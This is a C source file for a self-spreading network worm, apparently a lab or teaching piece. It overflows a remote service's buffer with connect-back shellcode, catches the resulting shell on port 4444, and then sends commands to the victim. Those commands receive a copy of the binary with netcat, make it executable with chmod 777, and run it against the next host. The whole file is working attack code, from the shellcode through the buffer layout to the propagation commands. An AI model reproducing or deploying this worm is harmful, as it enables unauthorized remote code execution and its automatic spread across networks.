#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>

#define BUF_SIZE 1064
#define RET 0xbffff25b // 0xbffff254 + 8 (8 bytes for the return address)
char *ip_attack;
struct sockaddr_in srv;
char buffer[BUF_SIZE];
char cmd[1024];
int victim;
char shellcode[] =
   "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\xB8\x1B\x40\x11\x17\x35\x11\x11\x11\x11\x50\x31\xC0\x66\x68\x11"
        "\x5c\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";
    ;

int sendattack(char *ip_attack, int port_attack)
{
  int s, i, size;
  struct sockaddr_in remote;
  struct hostent *host;
  memset(buffer, 0x90, BUF_SIZE);
  memcpy(buffer + 900 - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);

  for (i = 901; i < BUF_SIZE - 4; i += 4)
  {
    *((int *)&buffer[i]) = RET;
  }
  buffer[BUF_SIZE - 1] = 0x0;

  host = gethostbyname(ip_attack);
  if (host == NULL)
  {
    fprintf(stderr, "Unknown Host %s\n", ip_attack);
    return 0;
  }
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
  {
    fprintf(stderr, "Error: Socket\n");
    return 0;
  }

  remote.sin_family = AF_INET;
  remote.sin_addr = *((struct in_addr *)host->h_addr);
  remote.sin_port = htons(port_attack);

  if (connect(s, (struct sockaddr *)&remote, sizeof(remote)) == -1)
  {
    close(s);
    fprintf(stderr, "Error: connect\n");
    return 0;
  }

  size = send(s, buffer, sizeof(buffer), 0);
  if (size == -1)
  {
    close(s);
    fprintf(stderr, "sending data failed\n");
    return 0;
  }

  close(s);
  return 1;
}

void *createListener()
{
  victim = socket(AF_INET, SOCK_STREAM, 0);
  if (victim < 0)
  {
    fprintf(stderr, "Error: Socket\n");
    return;
  }

  srv.sin_family = AF_INET;
  srv.sin_addr.s_addr = INADDR_ANY;
  srv.sin_port = htons(4444);

  if (bind(victim, (struct sockaddr *)&srv, sizeof(srv)) == -1)
  {
    perror("Error: bind");
    return;
  }

  if (listen(victim, 3) == -1)
  {
    perror("Error: listen");
    return;
  }
}

void *spawn_worm()
{
  int size;
  int attack, attack_size;
  struct sockaddr_in cli;

  attack = accept(victim, (struct sockaddr *)&cli, &attack_size);

  if (attack == -1)
  {
    perror("accept() failed");
  }

  memcpy(cmd, "ls\x0A", 4);
  size = send(attack, cmd, 4, 0);

  size = recv(attack, cmd, sizeof(cmd), 0);

  cmd[size - 1] = 0;
  memcpy(cmd, "nc -l 10000 > simpleworm\x0a", 26);
  size = send(attack, cmd, 26, 0);

  sprintf(cmd, "nc %s 10000 < exploit\x0A", ip_attack);
  system(cmd);

  memcpy(cmd, "chmod 777 simpleworm\x0a", 22);
  size = send(attack, cmd, 22, 0);

  memcpy(cmd, "./simpleworm 10.81.0.8 5000\x0a", 29);
  size = send(attack, cmd, 29, 0);
}

int main(int argc, char *argv[])
{
  pthread_t thread1, thread2;
  int threatCreate;
  int targetPort = 5000;
  threatCreate = pthread_create(&thread1, NULL, createListener, NULL);
  ip_attack=argv[1];
  if (sendattack(ip_attack, targetPort))
  {
    printf("Successfully exploited\n\n");

    threatCreate = pthread_create(&thread2, NULL, spawn_worm, NULL);
    pthread_join(thread2, NULL);

    printf("---Attack completed---\n");
  }
  else
  {
    printf("Exploited fail\n");
  }
}
